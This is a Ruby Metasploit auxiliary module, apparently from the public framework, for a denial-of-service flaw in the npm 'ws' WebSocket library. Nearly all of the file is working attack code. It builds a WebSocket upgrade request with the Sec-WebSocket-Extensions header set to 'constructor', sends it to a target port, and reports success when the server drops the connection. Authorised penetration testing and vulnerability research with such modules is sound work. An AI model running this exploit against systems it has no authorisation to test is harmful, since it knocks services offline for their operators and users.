##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  def initialize
    super(
      'Name'           => 'ws - Denial of Service',
      'Description'    => %q{
          This module exploits a Denial of Service vulnerability in npm module "ws".
        By sending a specially crafted value of the Sec-WebSocket-Extensions header on the initial WebSocket upgrade request, the ws component will crash.
      },
      'References'     =>
        [
          ['URL', 'https://nodesecurity.io/advisories/550'],
          ['CWE', '400'],
        ],
      'Author'         =>
        [
          'Ryan Knell,  Sonatype Security Research',
          'Nick Starke, Sonatype Security Research',
        ],
      'License'        =>  MSF_LICENSE
    )

    register_options([
      Opt::RPORT(3000),
      OptString.new('TARGETURI', [true, 'The base path', '/']),
    ],)
  end

  def run
    path = datastore['TARGETURI']

    #Create HTTP request
    req = [
      "GET #{path} HTTP/1.1",
      "Connection: Upgrade",
      "Sec-WebSocket-Key: #{Rex::Text.rand_text_alpha(rand(10) + 5).to_s}",
      "Sec-WebSocket-Version: 8",
      "Sec-WebSocket-Extensions: constructor",  #Adding "constructor" as the value for this header causes the DoS
      "Upgrade: websocket",
      "\r\n"
      ].join("\r\n");

    begin
      connect
      print_status("Sending DoS packet to #{peer}")
      sock.put(req)

      data = sock.get_once(-1)  #Attempt to retrieve data from the socket

      if data =~ /101/   #This is the expected HTTP status code. IF it's present, we have a valid upgrade response.
        print_error("WebSocket Upgrade request Successful, service not vulnerable.")
      else
        fail_with(Failure::Unknown, "An unknown error occured")
      end

      disconnect
      print_error("DoS packet unsuccessful")

    rescue ::Rex::ConnectionRefused
      print_error("Unable to connect to #{peer}")
    rescue ::Errno::ECONNRESET, ::EOFError
      print_good("DoS packet successful. #{peer} not responding.")
    end
  end
end
